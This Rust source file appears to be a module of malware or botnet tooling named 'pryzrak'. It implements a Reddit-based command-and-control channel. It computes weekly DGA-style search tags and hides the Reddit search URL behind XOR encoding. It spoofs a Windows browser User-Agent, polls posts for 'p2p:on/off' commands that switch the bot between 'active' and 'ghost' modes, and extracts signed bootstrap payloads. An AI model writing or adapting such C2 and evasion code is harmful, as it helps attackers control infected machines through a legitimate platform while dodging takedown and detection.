use std::error::Error;
use std::time::{SystemTime, UNIX_EPOCH};
use log::debug;
use serde::Deserialize;
use super::BootstrapProvider;

/// Reddit Backup Provider (Tier 2.5)
/// Searches for DGA-derived tags on Reddit comments/posts
pub struct RedditProvider;

impl RedditProvider {
    pub fn generate_tag() -> String {
        let start = SystemTime::now();
        let seconds = start.duration_since(UNIX_EPOCH).unwrap().as_secs();
        // Weekly Slot: 604800 seconds
        let week_slot = seconds / 604800;
        
        let seed: u64 = 0x36A5EC9D09C60386;
        let mut state = week_slot ^ seed;
        state ^= state << 13;
        state ^= state >> 7;
        state ^= state << 17;
        
        let tag = format!("pryzrak-{:x}", state & 0xFFFF);
        crate::k::debug::log_detail!("Generated Tag: {}", tag);
        tag
    }
}

#[derive(Deserialize)]
struct RedditListing {
    data: RedditData,
}

#[derive(Deserialize)]
struct RedditData {
    children: Vec<RedditChild>,
}

#[derive(Deserialize)]
struct RedditChild {
    data: RedditContent,
}

#[derive(Deserialize)]
struct RedditContent {
    selftext: Option<String>,
    body: Option<String>,
}

impl RedditProvider {
    fn xd(encoded: &[u8], key: u8) -> String {
        encoded.iter().map(|b| (*b ^ key) as char).collect()
    }
    
    /// Poll Reddit for C2 commands (p2p:on/off)
    /// Returns Some("active") or Some("ghost") if found
    pub fn poll_command(&self) -> Option<String> {
        // Reuse fetch logic but look for specific keywords
        // We can ignore the error here as we are just polling
        if let Ok(content) = self.fetch_raw_content() {
            if content.contains("p2p:on") {
                return Some("active".to_string());
            } else if content.contains("p2p:off") {
                return Some("ghost".to_string());
            }
        }
        None
    }
    
    fn fetch_raw_content(&self) -> Result<String, Box<dyn Error + Send + Sync>> {
         let tag = Self::generate_tag();
        debug!("[Bootstrap] Reddit Searching Tag: {}", tag);
        
        // "https://www.reddit.com/search.json?q=" XOR 0x33
        let url_base_enc = [0x5b, 0x47, 0x47, 0x43, 0x40, 0x09, 0x1c, 0x1c, 0x44, 0x44, 0x44, 0x1d, 0x41, 0x56, 0x57, 0x57, 0x5a, 0x47, 0x1d, 0x50, 0x5c, 0x5e, 0x1c, 0x40, 0x56, 0x52, 0x41, 0x50, 0x5b, 0x1d, 0x59, 0x40, 0x5c, 0x5d, 0x1c, 0x42, 0x0e];
        
        let url = format!("{}{}&sort=new&limit=5", Self::xd(&url_base_enc, 0x33), tag);
        
        let resp: RedditListing = ureq::get(&url)
            .timeout(std::time::Duration::from_secs(15))
            .set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
            .call()?
            .into_json()?;

        // Aggregate all content
        let mut combined = String::new();
        for child in resp.data.children {
            let text = child.data.selftext.or(child.data.body).unwrap_or_default();
            combined.push_str(&text);
            combined.push('\n');
        }
        crate::k::debug::log_detail!("Fetched {} bytes from Reddit.", combined.len());
        Ok(combined)
    }
}

impl BootstrapProvider for RedditProvider {
    fn fetch_payload(&self) -> Result<String, Box<dyn Error + Send + Sync>> {
        // Implementation that parses specific SIG/MSG format for bootstrapping
        let content = self.fetch_raw_content()?;
        
        for line in content.lines() {
             if line.contains("SIG:") && line.contains("MSG:") {
                 return Ok(line.trim().to_string());
             }
         }
        
        let tag = Self::generate_tag();
        Err(format!("No signed payload found for tag {}", tag).into())
    }

    fn name(&self) -> String {
        "Reddit(Tier 2.5)".to_string()
    }
}
